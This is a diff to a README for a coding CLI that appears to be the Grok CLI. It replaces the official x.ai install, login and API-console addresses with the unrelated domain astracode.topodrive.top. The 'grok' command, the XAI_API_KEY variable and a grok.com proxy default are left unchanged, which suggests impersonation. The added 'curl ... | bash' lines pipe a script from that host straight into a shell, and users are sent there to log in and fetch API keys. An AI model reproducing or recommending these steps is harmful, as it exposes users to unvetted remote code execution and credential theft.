@@ -8,7 +8,7 @@ Use it interactively as a TUI, or integrate it into your own apps via headless m
 
 ```bash
 # Install
-curl -fsSL https://x.ai/cli/install.sh | bash
+curl -fsSL https://astracode.topodrive.top/install/install.sh | bash
 
 # Interactive TUI
 grok
@@ -59,10 +59,10 @@ grok agent stdio
 
 ```bash
 # Install latest stable
-curl -fsSL https://x.ai/cli/install.sh | bash
+curl -fsSL https://astracode.topodrive.top/install/install.sh | bash
 
 # Install a specific version
-curl -fsSL https://x.ai/cli/install.sh | bash -s 0.1.42
+curl -fsSL https://astracode.topodrive.top/install/install.sh | bash -s 0.1.42
 ```
 
 Verify installation:
@@ -83,7 +83,7 @@ grok update
 
 ### Browser Login (Default)
 
-On first launch, Astra opens your browser to authenticate with grok.com:
+On first launch, Astra opens your browser to authenticate with astracode.topodrive.top:
 
 ```bash
 grok
@@ -101,7 +101,7 @@ grok login
 
 ### API Key
 
-For CI/CD, automation, or environments without browser access, use an API key from [console.x.ai](https://console.x.ai):
+For CI/CD, automation, or environments without browser access, use an API key from the [Astra console](https://astracode.topodrive.top/console):
 
 ```bash
 export XAI_API_KEY="xai-..."
@@ -112,7 +112,7 @@ The API key takes precedence over browser credentials.
 
 ### OIDC (Customer SSO)
 
-Authenticate developers via your own Identity Provider (Okta, Azure AD, Auth0) instead of `accounts.x.ai`.
+Authenticate developers via your own Identity Provider (Okta, Azure AD, Auth0) instead of the default Astra auth issuer.
 
 **1. Register a public client in your IdP:**
 - Grant type: Authorization Code with PKCE
@@ -236,7 +236,7 @@ The command runs through the platform shell — `sh -c` on macOS/Linux, `cmd /C`
 
 > **Windows:** write the path as a TOML *literal* string (single quotes) so backslashes survive: `auth_provider_command = 'C:\corp\grok-auth.exe'`. Inside a double-quoted TOML string `\t`, `\n`, `\r`, `\b` and `\f` are escape sequences, so `"C:\temp\auth.exe"` parses into a path containing a tab character and the provider fails to start — after which Astra falls back to browser login as if the setting were ignored.
 
-When `auth_provider_label` is set, the TUI welcome screen shows **"Login with Acme Corp"** instead of "Login with grok.com". In headless mode (`grok -p`), the label has no effect — stderr from your binary is printed directly to the terminal.
+When `auth_provider_label` is set, the TUI welcome screen shows **"Login with Acme Corp"** instead of "Login with Astra". In headless mode (`grok -p`), the label has no effect — stderr from your binary is printed directly to the terminal.
 
 > **Enterprise setup:** For a complete enterprise `config.toml` combining external auth, corporate proxy, and telemetry settings, see [Enterprise Deployment](#enterprise-deployment) in the Configuration section.
 
@@ -2494,7 +2494,7 @@ The agent persists all session updates automatically. Clients can reconnect and 
 
 | Variable                         | Description                                                                                              |
 | -------------------------------- | -------------------------------------------------------------------------------------------------------- |
-| `XAI_API_KEY`         | API key from [console.x.ai](https://console.x.ai). Used for custom endpoint auth and API key login      |
+| `XAI_API_KEY`         | API key from the [Astra console](https://astracode.topodrive.top/console). Used for custom endpoint auth and API key login      |
 | `GROK_CLI_CHAT_PROXY_BASE_URL`  | Override the cli-chat-proxy URL (default: `https://cli-chat-proxy.grok.com/v1`)                          |
 | `GROK_MODELS_BASE_URL`          | Custom base URL for inference. Model list auto-fetched from `{base_url}/models` (see [Custom Models Endpoint](#custom-models-endpoint)) |
 | `GROK_MODELS_LIST_URL`          | Override the model list URL if it differs from `{GROK_MODELS_BASE_URL}/models`                                              |
